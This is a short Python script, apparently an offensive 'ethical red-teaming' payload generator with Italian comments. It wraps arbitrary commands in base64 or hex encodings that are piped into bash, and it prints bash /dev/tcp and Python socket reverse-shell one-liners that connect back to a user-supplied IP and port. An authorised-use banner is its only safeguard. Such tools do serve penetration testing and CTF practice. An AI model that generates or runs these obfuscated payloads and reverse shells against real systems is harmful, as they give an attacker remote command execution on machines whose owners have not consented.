#!/usr/bin/env python3
"""
Payload Generator (Red-Teaming Etico)
=====================================
Genera payload base64/obfuscati per test di sicurezza (solo ambienti autorizzati).

Esempio:
  python payload_generator.py --cmd "whoami" --encoding base64
"""

import argparse
import base64
import random
import string


def obfuscate_string(s: str) -> str:
    chars = list(s)
    random.shuffle(chars)
    return "".join(chars)


def generate_base64_payload(cmd: str) -> str:
    encoded = base64.b64encode(cmd.encode()).decode()
    return f"echo {encoded} | base64 -d | bash"


def generate_hex_payload(cmd: str) -> str:
    hex_encoded = cmd.encode().hex()
    return f"echo -n {hex_encoded} | xxd -r -p | bash"


def generate_reverse_shell_bash(ip: str, port: int) -> str:
    return f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"


def generate_reverse_shell_python(ip: str, port: int) -> str:
    return (
        f"python3 -c 'import socket,subprocess,os;"
        f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        f"s.connect((\"{ip}\",{port}));"
        f"os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);"
        f"subprocess.call([\"/bin/bash\"])'"
    )


def main():
    parser = argparse.ArgumentParser(description="Payload Generator (Red-Teaming Etico)")
    parser.add_argument("--cmd", help="Comando da codificare")
    parser.add_argument("--encoding", choices=["base64", "hex", "both"], default="base64")
    parser.add_argument("--reverse", choices=["bash", "python"], help="Genera reverse shell")
    parser.add_argument("--ip", help="IP per reverse shell")
    parser.add_argument("--port", type=int, help="Porta per reverse shell")
    args = parser.parse_args()

    print("[!] USO ESCLUSIVO IN AMBIENTI AUTORIZZATI (CTF, laboratori, test interni)")

    if args.cmd:
        if args.encoding in ["base64", "both"]:
            print(f"\n[*] Payload Base64:\n    {generate_base64_payload(args.cmd)}")
        if args.encoding in ["hex", "both"]:
            print(f"\n[*] Payload Hex:\n    {generate_hex_payload(args.cmd)}")

    if args.reverse:
        if not args.ip or not args.port:
            print("[!] Per reverse shell specificare --ip e --port")
            return
        if args.reverse == "bash":
            print(f"\n[*] Reverse Shell Bash:\n    {generate_reverse_shell_bash(args.ip, args.port)}")
        else:
            print(f"\n[*] Reverse Shell Python:\n    {generate_reverse_shell_python(args.ip, args.port)}")


if __name__ == "__main__":
    main()